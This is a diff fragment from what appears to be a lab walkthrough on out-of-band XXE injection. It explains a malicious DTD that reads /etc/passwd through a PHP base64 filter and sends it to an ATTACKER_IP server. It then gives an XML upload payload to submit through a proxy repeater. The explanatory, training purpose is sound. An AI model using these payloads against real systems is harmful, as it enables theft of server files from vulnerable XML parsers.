@@ -174,3 +174,17 @@ Save the sample DTD file below and name it as sample.dtd. The payload below will
 <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
 %oobxxe;
 
+
+
+DTD Payload Explained
+
+The DTD begins with a declaration of an entity %cmd that points to a system resource. The %cmd entity refers to a resource within the PHP filter protocol php://filter/convert.base64-encode/resource=/etc/passwd. It retrieves the content of /etc/passwd, a standard file in Unix-based systems containing user account information. The convert.base64-encode filter encodes the content in Base64 format to avoid formatting problems. The %oobxxe entity contains another XML entity declaration, exfil, which has a system identifier pointing to the attacker-controlled server. It includes a parameter named data with %cmd, representing the Base64-encoded content of /etc/passwd. When %oobxxe; is parsed, it creates the exfil entity that connects to an attacker's server (http://ATTACKER_IP:1337/). The parameter ?data=%cmd sends the Base64-encoded content from %cmd.
+
+Go back to the repeater and change your payload to:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
+<upload>
+    <file>&exfil;</file>
+</upload>
+
